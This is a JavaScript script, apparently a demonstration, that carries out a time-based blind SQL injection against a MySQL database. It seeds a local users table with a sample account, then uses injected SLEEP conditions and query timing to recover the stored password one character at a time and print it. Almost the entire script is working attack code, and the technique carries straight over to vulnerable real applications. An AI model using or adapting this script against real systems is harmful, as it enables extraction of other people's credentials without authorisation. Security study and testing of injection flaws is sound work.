import mysql from 'mysql2/promise';

const targetUser = 'alice';
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
const maxPasswordLength = 20;
const sleepSeconds = 5;
const delayThreshold = 4000;
const maxRetries = 3;

const connection = await mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'root',
  database: 'test'
});

// Ensure table and sample data
await connection.execute(`
  CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255),
    password VARCHAR(255)
  )
`);
const [rows] = await connection.execute(`SELECT COUNT(*) AS count FROM users`);
if (rows[0].count === 0) {
  await connection.execute(`INSERT INTO users (name, password) VALUES ('alice', 'apple123')`);
}

let discoveredPassword = '';

for (let position = 1; position <= maxPasswordLength; position++) {
  let foundChar = null;

  for (const char of charset) {
    const injection = `${targetUser}' AND IF(BINARY SUBSTRING(password, ${position}, 1) = '${char}', SLEEP(${sleepSeconds}), 0) -- `;
    const query = `SELECT * FROM users WHERE name = '${injection}'`;

    let attempts = 0;
    while (attempts < maxRetries) {
      const start = Date.now();
      try {
        await connection.query(query);
      } catch (e) {
        console.error("Query error:", e.message);
        break;
      }
      const end = Date.now();
      const duration = end - start;

      if (duration > delayThreshold) {
        discoveredPassword += char;
        console.log(`Position ${position}: '${char}' ⏱️ ${duration}ms`);
        foundChar = char;
        break;
      }

      attempts++;
    }

    if (foundChar) break;
  }

  if (!foundChar) {
    console.log(`No match at position ${position}. Assuming end of password.`);
    break;
  }
}

await connection.end();
console.log(`\n🔓 Discovered password for '${targetUser}': ${discoveredPassword}`);
